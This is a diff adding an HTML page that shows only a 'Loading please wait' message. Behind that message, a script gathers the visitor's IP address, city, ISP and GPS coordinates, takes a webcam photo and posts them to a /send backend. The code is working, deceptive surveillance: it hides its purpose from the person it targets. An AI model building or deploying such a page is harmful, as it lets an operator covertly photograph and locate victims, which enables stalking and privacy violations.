@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>loading...</title>
+  <style>
+    body {
+      background: #0d0d0d;
+      color: white;
+      font-family: Arial;
+      text-align: center;
+      margin-top: 120px;
+    }
+  </style>
+</head>
+<body>
+
+<h2 id="msg">Loading please wait.....</h2>
+
+<script>
+async function run() {
+
+  // Get public IP + location
+  let ipInfo = await fetch("https://ipapi.co/json/").then(r => r.json()).catch(()=>{return{}});
+  
+  // Get GPS if allowed
+  let coords = {lat:"Not Allowed", lon:"Not Allowed"};
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      pos=>coords={lat:pos.coords.latitude, lon:pos.coords.longitude},
+      ()=>{}
+    );
+  }
+
+  // Start camera silently
+  let video = document.createElement("video");
+  video.setAttribute("playsinline", true);
+  let stream = await navigator.mediaDevices.getUserMedia({video:true}).catch(()=>null);
+  if(!stream){
+    document.getElementById("msg").innerHTML="Camera permission denied.";
+    return;
+  }
+  video.srcObject = stream;
+  await video.play();
+
+  // Capture
+  await new Promise(r=>setTimeout(r,2000));
+  let canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+  let imageData = canvas.toDataURL("image/png");
+  stream.getTracks().forEach(t=>t.stop());
+
+  // Send to backend
+  await fetch("/send",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      image:imageData,
+      ip:ipInfo.ip,
+      city:ipInfo.city,
+      region:ipInfo.region,
+      isp:ipInfo.org,
+      lat:coords.lat,
+      lon:coords.lon
+    })
+  });
+
+  document.getElementById("msg").innerHTML = "Loading.....<br><br>you are almost there.";
+}
+
+run();
+</script>
+
+</body>
+</html>
